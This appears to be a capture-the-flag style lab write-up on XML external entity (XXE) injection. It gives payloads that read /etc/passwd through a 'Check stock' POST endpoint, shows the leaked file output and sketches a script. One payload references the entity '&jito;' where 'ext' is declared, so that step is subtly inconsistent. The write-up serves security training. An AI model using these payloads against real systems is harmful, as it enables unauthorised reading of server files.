### Lab: Exploiting XXE using external entities to retrieve files

This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

To solve the lab, inject an XML external entity to retrieve the contents of the /etc/passwd file.

_____

Analysis and Exploit:

1. "Check stock" feature a POST **/product/stock**
    - ```<?xml version="1.0" encoding="UTF-8"?>```  
    ```<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>```
2. Modify XML to inject an external entity
    - ```<?xml version="1.0" encoding="UTF-8"?>```  
    ```<!DOCTYPE jito [ <!ENTITY ext SYSTEM "file:///etc/passwd"> ]>```  
    ```<stockCheck><productId>&jito;</productId><storeId>1</storeId></stockCheck>```
3. **[BURP-REPEATER]** send POST with modified XML with external entity to retrieve the content of the file /etc/passwd
    - Works!
    - Returns error 400 Bad Request
    - ```"Invalid product ID: root:x:0:0:root:/root:/bin/bash```  
```daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin```  
```bin:x:2:2:bin:/bin:/usr/sbin/nologin```  
```sys:x:3:3:sys:/dev:/usr/sbin/nologin```

_____

Script:

1. Send POST request with payload | POST **/product/stock** | params: 'xml payload'
    - ```<?xml version="1.0" encoding="UTF-8"?>```  
    ```<!DOCTYPE jito [ <!ENTITY ext SYSTEM "file:///etc/passwd"> ]>```     
    ```<stockCheck><productId>&ext;</productId><storeId>1</storeId></stockCheck>```  
    - If response status code == 400 and "Invalid product ID: root:x:0:0:root:/root:/bin/bash" in the response text:
        - Works! 